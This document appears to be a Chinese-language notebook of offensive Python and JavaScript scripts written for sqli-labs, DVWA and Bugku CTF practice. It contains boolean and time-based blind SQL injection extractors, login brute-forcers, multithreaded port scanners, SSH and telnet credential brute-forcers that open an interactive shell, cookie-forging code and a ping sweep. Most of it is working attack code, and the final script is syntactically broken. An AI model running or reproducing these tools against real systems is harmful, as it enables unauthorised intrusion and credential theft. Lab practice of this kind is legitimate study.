# sql-labs-master 第一关，get型sql注入
```py
'''
布尔盲注：http://10.16.102.162/sqli-labs-master/Less-1/
判断是否存在单引号闭合的sql注入
poc编写：结果有或者没有
'''
import requests
def verify(url,i):
    i=str(i)
    for j in range(1,7):
        if j==1:
            payload1 = "/?id=1' and 1=1 --+"
            payload2 = "/?id=1' and 1=2 --+"
            resp1 = requests.get(url+i+payload1)
            resp2 = requests.get(url+i+payload2)
            text1 = resp1.text
            text2 = resp2.text
            if (text1!=text2) and (len(text1)!=len(text2)):
                print(url,i,'/：存在单引号闭合的sql注入')
                break
        if j==2:
            payload1 = '/?id=1" and 1=1 --+'
            payload2 = '/?id=1" and 1=2 --+'
            resp1 = requests.get(url+i+payload1)
            resp2 = requests.get(url+i+payload2)
            text1 = resp1.text
            text2 = resp2.text
            if (text1!=text2) and (len(text1)!=len(text2)):
                print(url,i,'/：存在双引号闭合的sql注入')
                break
        if j==3:
            payload1 = "/?id=1') and 1=1 --+"
            payload2 = "/?id=1') and 1=2 --+"
            resp1 = requests.get(url+i+payload1)
            resp2 = requests.get(url+i+payload2)
            text1 = resp1.text
            text2 = resp2.text
            if (text1!=text2) and (len(text1)!=len(text2)):
                print(url,i,"/：存在')闭合的sql注入")
                break
        if j==4:            
            payload1 = '/?id=1") and 1=1 --+'
            payload2 = '/?id=1") and 1=2 --+'
            resp1 = requests.get(url+i+payload1)
            resp2 = requests.get(url+i+payload2)
            text1 = resp1.text
            text2 = resp2.text
            if (text1!=text2) and (len(text1)!=len(text2)):
                print(url,i,'/：存在")闭合的sql注入')
                break
        if j==5:            
            payload1 = '/?id=1")) and 1=1 --+'
            payload2 = '/?id=1")) and 1=2 --+'
            resp1 = requests.get(url+i+payload1)
            resp2 = requests.get(url+i+payload2)
            text1 = resp1.text
            text2 = resp2.text
            if (text1!=text2) and (len(text1)!=len(text2)):
                print(url,i,'/：存在"))闭合的sql注入')
                break
        if j==6:
            payload1 = "/?id=1')) and 1=1 --+"
            payload2 = "/?id=1')) and 1=2 --+"
            resp1 = requests.get(url+i+payload1)
            resp2 = requests.get(url+i+payload2)
            text1 = resp1.text
            text2 = resp2.text
            if (text1!=text2) and (len(text1)!=len(text2)):
                print(url,i,"/：存在'))闭合的sql注入")
                break    
for i in range(1,76):
    verify('http://10.16.102.162/sqli-labs-master/Less-',i)
```
## get型sql注入之判断数据库长度
```py
import requests
def verify(url,m):
    m=str(m)
    for i in range(1,65):
        for j in range(1,7):
            if j==1:
                payload1="?id=1' and length(database())={} and 1=1 --+".format(i)
                payload2="?id=1' and length(database())={} and 1=2 --+".format(i)
                reps1=requests.get(url+m+payload1)
                reps2=requests.get(url+m+payload2)
                text1=reps1.text
                text2=reps2.text
                if (text1!=text2) and (len(text1)!=len(text2)):
                    print(url,m,"的数据库长度为",i)
                    break    
            if j==2:
                payload1='?id=1" and length(database())={} and 1=1 --+'.format(i)
                payload2='?id=1" and length(database())={} and 1=2 --+'.format(i)
                reps1=requests.get(url+m+payload1)
                reps2=requests.get(url+m+payload2)
                text1=reps1.text
                text2=reps2.text
                if (text1!=text2) and (len(text1)!=len(text2)):
                    print(url,m,"的数据库长度为",i)
                    break
            if j==3:
                payload1="?id=1') and length(database())={} and 1=1 --+".format(i)
                payload2="?id=1') and length(database())={} and 1=2 --+".format(i)
                reps1=requests.get(url+m+payload1)
                reps2=requests.get(url+m+payload2)
                text1=reps1.text
                text2=reps2.text
                if (text1!=text2) and (len(text1)!=len(text2)):
                    print(url,m,"的数据库长度为",i)
                    break
            if j==4:
                payload1='?id=1") and length(database())={} and 1=1 --+'.format(i)
                payload2='?id=1") and length(database())={} and 1=2 --+'.format(i)
                reps1=requests.get(url+m+payload1)
                reps2=requests.get(url+m+payload2)
                text1=reps1.text
                text2=reps2.text
                if (text1!=text2) and (len(text1)!=len(text2)):
                    print(url,m,"的数据库长度为",i)
                    break
            if j==5:
                payload1="?id=1')) and length(database())={} and 1=1 --+".format(i)
                payload2="?id=1')) and length(database())={} and 1=2 --+".format(i)
                reps1=requests.get(url+m+payload1)
                reps2=requests.get(url+m+payload2)
                text1=reps1.text
                text2=reps2.text
                if (text1!=text2) and (len(text1)!=len(text2)):
                    print(url,m,"的数据库长度为",i)
                    break
            if j==6:
                payload1='?id=1")) and length(database())={} and 1=1 --+'.format(i)
                payload2='?id=1")) and length(database())={} and 1=2 --+'.format(i)
                reps1=requests.get(url+m+payload1)
                reps2=requests.get(url+m+payload2)
                text1=reps1.text
                text2=reps2.text
                if (text1!=text2) and (len(text1)!=len(text2)):
                    print(url,m,"的数据库长度为",i)
                    break
for m in range(1,76):
    verify('http://10.16.102.162/sqli-labs-master/Less-',m)
    print("剩余{}/76".format(76-m))

```
## 判断数据库名
```py
import requests
def verify(url):
    s='abcdefghijklmnopqrstuvwxyz'
    for j in range(1,65):
        m=0
        for i in s:
            payload1="?id=1' and substr(database(),{0},1)='{1}' and 1=1 --+".format(j,i)
            payload2="?id=1' and substr(database(),{0},1)='{1}' and 1=2 --+".format(j,i)
            resp1=requests.get(url+payload1)
            resp2=requests.get(url+payload2)
            text1=resp1.text
            text2=resp2.text
            if (text1!=text2) and (len(text1)!=len(text2)):
                print(i,end="")
                m=1
                break
        if m==0 and j==1:
            print("不存在")
            break
        if m==0:
            print()
            break
verify('http://10.16.102.162/sqli-labs-master/Less-1')
```
## post型sql注入
```py
import requests
url="http://10.16.102.162/sqli-labs-master/Less-11/"
payload1="admin' or '1'='1 #"
payload2="admin' and '1'='1 #"
response1=requests.post(url,data={'uname':payload1,'passwd':11111})
response2=requests.post(url,data={'uname':payload2,'passwd':11111})
text1=response1.text
text2=response2.text
if (text1!=text2) and (len(text1)!=len(text2)):
    print("存在post注入")
```
## post型登录框爆破脚本
```py
#4位数字
import requests
s='0123456789'
url="http://10.16.102.162/DVWA/vulnerabilities/brute/?"
m=0
n=1
username=input("请输入用户名")
data2={'username':username,'password':00000,'Login':'Login'}
headers={'cookie':'security=low; PHPSESSID=711ce5ff0b53f2c388c15b16bfdc1b84'}
response2=requests.post(url,data2,headers=headers)
text2=response2.text
for a in s:
    if m==1:
        break
    for b in s:
        if m==1:
            break
        for c in s:
            if m==1:
                break
            for d in s:
                if m==1:
                    break
                password=a+b+c+d
                data1={'username':username,'password':password,'Login':'Login'}
                response1=requests.post(url,data1,headers=headers)
                text1=response1.text
                print("\r"+"字典进度为",n,"/",(len(s))**4,end="",flush=True)
                n=n+1
                if (text1!=text2) and len(text1)!=len(text2):
                    print("\n成功！")
                    print("用户名为：",username)
                    print("密码为：",password)
                    m=1
                    break

```
## get型登录框爆破脚本
```py
#4位数字
import requests
s='0123456789'
url="http://10.16.102.162/DVWA/vulnerabilities/brute/?"
m=0
n=1
username=input("请输入用户名")
data2={'username':username,'password':00000,'Login':'Login'}
headers={'cookie':'security=low; PHPSESSID=711ce5ff0b53f2c388c15b16bfdc1b84'}
response2=requests.get(url,data2,headers=headers)
text2=response2.text
for a in s:
    if m==1:
        break
    for b in s:
        if m==1:
            break
        for c in s:
            if m==1:
                break
            for d in s:
                if m==1:
                    break
                password=a+b+c+d
                data1={'username':username,'password':password,'Login':'Login'}
                response1=requests.get(url,data1,headers=headers)
                text1=response1.text
                print("\r"+"字典进度为",n,"/",(len(s))**4,end="",flush=True)
                n=n+1
                if (text1!=text2) and len(text1)!=len(text2):
                    print("\n成功！")
                    print("用户名为：",username)
                    print("密码为：",password)
                    m=1
                    break
```
## 调用文本字典get型登录框爆破脚本
```py
import requests
url="http://10.16.102.162/DVWA/vulnerabilities/brute/?"
n=1
username=input("请输入用户名")
data2={'username':username,'password':00000,'Login':'Login'}
headers={'cookie':'security=low; PHPSESSID=711ce5ff0b53f2c388c15b16bfdc1b84'}
response2=requests.get(url,data2,headers=headers)
text2=response2.text
f=open("22.txt","r+")
for i in f:
    password=i.strip()
    data1={'username':username,'password':password,'Login':'Login'}
    response1=requests.get(url,data1,headers=headers)
    text1=response1.text
    #print("\r"+"字典进度为",n,"/",(len(s))**4,end="",flush=True)
    n=n+1
    if (text1!=text2) and len(text1)!=len(text2):
        print("\n成功！")
        print("用户名为：",username)
        print("密码为：",password)
        break
```
## 端口扫描器
```py
#单线程
from socket import *  #引入socket模块
setdefaulttimeout(1)  #超时时间为1秒
def portscanner(host,port):
    try:
        s=socket(AF_INET,SOCK_STREAM) #实例化一个socket对象
        s.connect((host,port))  #与目标服务器指定端口建立socket连接
        print("%d open" % port)
        s.close()
    except BaseException:
        print("%d close" % port)
def main():
    setdefaulttimeout(1)  #超时时间为1秒
    for port in range(1,65535):
        portscanner('10.16.102.162',port)    
if __name__=='__main__':
    main()
```
## 多线程
```py
#端口扫描
from socket import *
def portScanner(host,port):
    try:
        s = socket(AF_INET,SOCK_STREAM)
        s.connect((host,port))
        print('[+] %d open' % port)
        s.close()
    except:
        print('[-] %d close' % port)
def main():
    setdefaulttimeout(1)
    for p in range(1,1024):
        portScanner('192.168.0.100',p)
if __name__ == '__main__':
    main()
```
```py
#多线程
from socket import *
import threading
lock = threading.Lock()
openNum = 0
threads = []
def portScanner(host,port):
    global openNum
    try:
        s = socket(AF_INET,SOCK_STREAM)
        s.connect((host,port))
        lock.acquire()
        openNum+=1
        print('[+] %d open' % port)
        lock.release()
        s.close()
    except:
        pass
def main():
    setdefaulttimeout(1)
    for p in range(1,1024):
        t = threading.Thread(target=portScanner,args=('192.168.0.100',p))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print('[*] The scan is complete!')
    print('[*] A total of %d open port ' % (openNum))
if __name__ == '__main__':
    main()
```
```py
#参数解析端口扫描
import threading
from socket import *
from argparse import *
lock=threading.Lock()
threads=[]
def portscanner(host,port):
    try:
        s=socket(AF_INET,SOCK_STREAM)
        s.connect((host,port))
        lock.acquire()
        print(port,"open")
        lock.release()
        s.close()
    except:
        pass
def xiancheng(host):
    setdefaulttimeout(1)
    #semaphore=threading.BoundedSemaphore(200)
    for port in range(1,65536):
        t=threading.Thread(target=portscanner,args=(host,port))
        threads.append(t)
        #print(port)
    for t in threads:
        t.start()    
def main():
    p=ArgumentParser()  #声明参数解析对象
    p.add_argument("-H",dest="host",type=str) #添加可选参数
    args=p.parse_args() #从对象获取参数
    hostlist=args.host.split(",") #匹配单引号左右的host
    for host in hostlist:
        xiancheng(host)
if __name__=='__main__':
    main()
```
## 页面快速计算(秋名山老司机)
```py
import requests
import re
url="http://123.206.87.240:8002/qiumingshan/"
s=requests.Session()  #储存session
r=s.get(url)  #用此身份执行get请求
searchobj=re.search(r'(\d+[+-/*])+(\d+)',r.text).group()  #匹配响应包，进行分组，以便计算
result=eval(searchobj)  #计算表达式
print(result)
post={'result':result}
res=s.post(url,post)
print(res.text)
```
## 页面快速解码（速度要快）
```py
import requests
import re
import base64
url="http://123.206.87.240:8002/web6/"
s=requests.Session()  #储存session
res=s.get(url).headers  #返回响应头的数据
base1=base64.b64decode(res['flag']).decode('utf-8').split(':')[1] #对响应头的flag中的数据进行base64进行解码，然后输出冒号右面的字符串，[0]就对应冒号左边的字符串，decode('utf-8')是对二进制进行utf-8编码。
print(base1)
base2=base64.b64decode(base1).decode('utf-8')
print(base2)
base3=re.search('\d+',base2)  #re.search方法返回一个匹配的对象，否则返回None
print(base3.group())  #group()获得所有匹配表达式
post={'margin':base2}
print(s.post(url,post).text)
```
## 按行查看文件内容
```py
import requests
s=requests.Session()
for i in range(1,30):
    url="http://123.206.87.240:8002/web11/index.php?line={}&filename=aW5kZXgucGhw".format(i)
    res=s.get(url)
    print(res.text)
```

```py
import requests
import sys
# 基于时间的盲注，过滤了逗号 ,
sql = "127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)='{1}' then sleep(5) else 0 end))--+"
url = 'http://120.24.86.145:8002/web15/'
flag = ''
for i in range(1, 40):
    print('正在猜测：', str(i))
    for ch in range(10, 129):
        if ch == 128:
            sys.exit(0)
        sqli = sql.format(i, chr(ch))
        # print(sqli)
        header = {
            'X-Forwarded-For': sqli
        }
        try:
            html = requests.get(url, headers=header, timeout=3)
        except:
            flag += chr(ch)
            print(flag)
            break
```
```py
import sys
def aa():
    try:
        for i in range(1,100):
            for j in range(1,100):
                print(i,j)
                if i==50:
                    sys.exit(1)
    except:
        print('ww')
aa()
print("qq")
```
```js
function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length)
    }
    return ""
}
function decode_create(temp) {
    var base = new Base64();
    var result = base.decode(temp);
    var result3 = "";
    for (i = 0; i < result.length; i++) {
        var num = result[i].charCodeAt();  #charCodeAt()是返回result的位置为i的字符的unicode
        num = num ^ i;
        num = num - ((i % 10) + 2);
        result3 += String.fromCharCode(num) #根据unicode返回字符
    }
    return result3
}
function ertqwe() {
    var temp_name = "user";
    var temp = getCookie(temp_name);
    temp = decodeURIComponent(temp);
    var mingwen = decode_create(temp);
    var ca = mingwen.split(';');
    var key = "";
    for (i = 0; i < ca.length; i++) {
        if ( - 1 < ca[i].indexOf("flag")) {
            key = ca[i + 1].split(":")[2]
        }
    }
}
```
## 江湖魔头-BugkuCTF平台(解密和加密)
```js
//解密
var temp = getCookie('user');
temp = decodeURIComponent(temp);
var mingwen = decode_create(temp);
console.log(mingwen)
```
```js
//加密
a="O:5:\"human\":10:{s:8:\"xueliang\";i:774;s:5:\"neili\";i:747;s:5:\"lidao\";i:80;s:6:\"dingli\";i:55;s:7:\"waigong\";i:0;s:7:\"neigong\";i:0;s:7:\"jingyan\";i:0;s:6:\"yelian\";i:0;s:5:\"money\";i:9999999999;s:4:\"flag\";s:1:\"0\";}";
b="";
for (i = 0; i < a.length; i++) {
        var num = a[i].charCodeAt();
        num = num + ((i % 10) + 2);
        num = num ^ i;
        b += String.fromCharCode(num);
    }
var input=b
_keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="; 
// public method for encoding
var output = "";
var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
var i = 0;
//input = _utf8_encode(input);
while (i < input.length) {
    chr1 = input.charCodeAt(i++);
    chr2 = input.charCodeAt(i++);
    chr3 = input.charCodeAt(i++);
    enc1 = chr1 >> 2;
    enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
    enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
    enc4 = chr3 & 63;
    if (isNaN(chr2)) {
        enc3 = enc4 = 64;
    } else if (isNaN(chr3)) {
        enc4 = 64;
    }
    output = output +
    _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
    _keyStr.charAt(enc3) + _keyStr.charAt(enc4);
}
temp = encodeURIComponent(output);
//console.log(temp)
document.cookie='user='+temp
```
## base64加密与解密
```py
import base64
def Base64(str1,n):
    n=int(n)
    try:
        if n==1:
            encodestr1=base64.b64encode(str1.encode('utf-8'))  #base64编码
            print(str(encodestr1,'utf-8'))
        elif n==2:
            decodestr2=base64.b64decode(str1.decode('utf-8')) #base64解码
            print(str(decodestr2,'utf-8'))  #输出成字符串格式
        else:  
            print("输入错误")
    except:
        print("输入错误")
str1=input("请输入字符串")
print("1.编码，2.解码")
n=input()
Base64(str1,n)
```
## url编码与解码
```py
import urllib.parse
def url(s,n):
    try:
        n=int(n)
        if n==1:
            urls=urllib.parse.quote(s)  #url编码
            print(urls)
        elif n==2:
            unurls=urllib.parse.unquote(s)  #url解码
            print(unurls)
        else:  
            print("输入错误")
    except:
        print("输入错误")
s=input("请输入字符串")
print("1.编码，2.解码")
n=input()
url(s,n)
```
## ascii十六进制编码与解码
```py
import binascii
def ascii16(s,n):
    try:
        n=int(n)
        if n==1:
            h=binascii.b2a_hex(s.encode('utf-8'))  #把unicode字符串编码为二进制ascii十六进制
            m=str(h.decode('ascii'))
            print('0x'+m)  #二进制ascii十六进制转换为十六进制字符串
        elif n==2:
            p=binascii.a2b_hex(s.encode('utf-8'))  #把十六进制字符串转换为二进制字符串
            n=str(p.decode('ascii'))
            print(n)
        else:
            print("输入错误")
    except:
        print("输入错误")
s=input("请输入字符串")
print("1.编码，2.解码")
n=input()
ascii16(s,n)
```
## md5加密
```py
import hashlib
def md5(s):
    h=hashlib.md5()  #创建md5对象
    h.update(s.encode('utf-8')) #把s加密成md5并返回给对象h
    print(h.hexdigest())  #把h以16进制字符串输出
s=input("请输入要加密成md5的字符串")
md5(s)
```
## ssh弱口令爆破脚本
```py
import paramiko  #属于python库，实现sshv2协议
client=paramiko.SSHClient()  #实例化SSHClient，SSHClient常用于执行远程命令
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  #默认继续远程连接，保存服务器主机名和密钥信息，自动添加策略，那么不再本地know_hosts文件中记录的主机将无法连接。
ip='192.168.85.128'
client.connect(hostname=ip,port=22,username='root',password='root') #连接ssh服务器，进行用户名和密码验证
while 1:
    cmd=input("shell>")
    stdin,stdout,stderr=client.exec_command(cmd) #stdin为输入，stdout为正确输出，stderr为错误输出，同时只有一个变量有值。
    print(stdout.read().decode('utf-8'))
client.close()
```
```py
#调用文本单线程爆破
import paramiko
import sys
def ssh():
    __stderr__ = sys.stderr  #将当前默认的错误输出结果保存为__stderr__
    sys.stderr=open('error.log','a') #将报错信息储存在2.txt中，并赋予读权限
    client=paramiko.SSHClient() #实例化SSHClient，SSHClient用于执行远程命令
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #默认远程连接，保存服务器主机名和密钥，自动添加策略
    ip='192.168.85.128'
    f=open("username.txt","r+").readlines()
    g=open("password.txt","r+").readlines()
    n=0
    for i in f:
        username=i.strip()
        for j in g:
            password=j.strip()
            try:
                n+=1
                print("\r"+"字典进度为：",n,end="",flush=True)
                client.connect(hostname=ip,port=22,username=username,password=password,timeout=1)
                print("\nusername:",username,"\npassword:",password)
                while 1:
                    cmd=input("shell>")
                    stdin,stdout,stderr=client.exec_command(cmd) #stdin为输入，stdout为正确输出，stderr为错误输出，同时只有一个变量有值。
                    print(stdout.read().decode('utf-8'))
                #client.close()
                return
            except BaseException:
                continue
ssh()

```
```py
#多线程字典暴力破解
import paramiko
import sys
import threading
__stderr__ = sys.stderr  #将当前默认的错误输出结果保存为__stderr__
sys.stderr=open('error.log','a') #将报错信息储存在2.txt中，并赋予读权限
ip='192.168.85.128' 
m=1
n=0
def ssh(se,ip,username,password):
    try:
        global m,n
        se.acquire()  #获得信号量，信号量减一
        client=paramiko.SSHClient() #实例化SSHClient，SSHClient用于执行远程命令
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #默认远程连接，保存服务器主机名和密钥，自动添加策略
        client.connect(hostname=ip,port=22,username=str(username),password=str(password),timeout=10)
        print("\n成功！！！\nusername:",username,"\npassword:",password)
        while 1:
            print()
            cmd=input("shell>")
            stdin,stdout,stderr=client.exec_command(cmd) #stdin为输入，stdout为正确输出，stderr为错误输出，同时只有一个变量有值。
            print(stdout.read().decode('utf-8'))
        return
    except BaseException:
        se.release() #释放信号量，信号量加一
def duo(ip):
    f=open("user.txt","r").readlines()
    g=open("pass1.txt","r").readlines()
    global m,n
    semaphore=threading.Semaphore(10)
    for i in f:
        username=i.strip()
        for j in g:
            password=j.strip()
            n=n+1
            print("\r"+"字典进度为：",n,"waiting....",end="",flush=True)
            t=threading.Thread(target=ssh,args=(semaphore,ip,username,password))
            t.start()
if __name__=='__main__':
    duo(ip)
```

## telnet弱口令爆破
```py
#!usr/bin/env python
#!coding=utf-8

import telnetlib
#import eventlet
import sys
#import timeout_decorator
import threading
#ventlet.monkey_patch()
# __stderr__ = sys.stderr  # 将当前默认的错误输出结果保存为__stderr__
# sys.stderr = open('error.log', 'a')
b=0
#@timeout_decorator.timeout(10)
def telnet1(se,username,password):
    try:
        se.acquire()
        print(2)
        #eventlet.monkey_patch()
        host='10.7.255.72'
        # username='kali'
        # password='kali'
        global b
        if b==1:
            sys.exit(0)
        tn=telnetlib.Telnet(host,port=23,timeout=2) #连接Telnet服务器,超时连接为10
        #tn.set_debuglevel(1) #打开调试级别2，显示详细信息
        #print(tn)
        tn.read_until('login'.encode()) #匹配'Username:'字符串
        tn.write(username.encode('ascii')+'\n'.encode('ascii')) #在匹配字符串后输入username
        tn.read_until('Password:'.encode()) #匹配'Password:'字符串
        tn.write(password.encode('ascii')+'\n'.encode('ascii')) #在匹配字符串后输入password
        tn.read_until(b'$')
        # for i in range(11):
        #     tn.read_some()
        # result = tn.read_some()  # 调试多次，并赋值给result
        # print(result)
        # print('username:', username, 'password:', password)
        while 1:
            b=1
            cmd=input("shell>")
            tn.write(cmd.encode() + b'\n')
            r = tn.read_until(b'$').decode('ASCII')
            print(r)
            #sys.exit(0)
        return
        #sys.exit(0)
    except:
        #print("err",'username:',username,'password:',password)
        se.release()
def xun():
    f=open("user.txt","r").readlines()
    g=open("pass1.txt","r").readlines()
    semaphore=threading.Semaphore(10)
    for i in f:
        username=i.strip()
        for j in g:
            password=j.strip()
            #print(11)
            a=threading.Thread(target=telnet1,args=(semaphore,username,password))
            #print(username,password)
            a.start()
            # if telnet(username,password) == 1:
            #     return
xun()
```

## 多线程爬取图片
```py
import requests
import os
import json
import threading
from lxml import etree
def pa(j):
    num = j['ename']
    name = j['cname']
    res2 = requests.get("https://pvp.qq.com/web201605/herodetail/{}.shtml".format(num))
    res2_decode = res2.content.decode('gbk')  # 返回相应的html页面，字符串格式，解码为utf-8
    _element = etree.HTML(res2_decode)  # 将html转换为_Element对象，可以方便的使用getparent()、remove()、xpath()等方法
    element_img = _element.xpath('//div[@class="pic-pf"]/ul/@data-imgname')
    # print(element_img)
    name_img = element_img[0].split('|')  # 去掉字符串中的|字符,并分割,生成的文件类型是列表
    #print(name_img)
    for i in range(0,10):
        res1=requests.get("https://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/{0}/{0}-bigskin-{1}.jpg".format(num,i+1))  #返回响应包
        if res1.status_code == 200:
            aa=name_img[i].find('&')  #获取&的下标
            #print(aa)
            bb=name_img[i][:aa]  #获取列表0到&下标的文件
            res_img=res1.content   #把相应包内容转换为2进制
            a = './test/' + str(name)
            b='./test/'+str(name)+'/'+bb+'.jpg'
            if not os.path.exists(a):
                os.mkdir(a)
            with open(b,"wb") as f:   #创建一个名为1.jpg的图片
                f.write(res_img)   #把响应包2进制内容写入到1.jpg中
                print(name, bb)
        else:
            break
def duo():
    response=requests.get('https://pvp.qq.com/web201605/js/herolist.json')
    data=json.loads(response.text)
    for j in data:
        t=threading.Thread(target=pa,args=(j,))
        t.start()
duo()
```

## 探测存活主机
```py
import subprocess as p
import threading
def ping(ip,se):
    pings=p.Popen('ping -n 2 %s' % ip ,shell=True,stdin=p.PIPE,stdout=p.PIPE,stderr=p.PIPE,encoding='gbk')
    result=pings.stdout.read()
    if 'ms' in result:
        print(ip,'open') 
def duo(ip):
    semaphore=threading.Semaphore(10)
    for i in range(1,256):
        t=threading.Tread(target=ping,args=('192.168.250.'+i,semaphore))
        t.start()
if __name__='__main__':
    duo()
```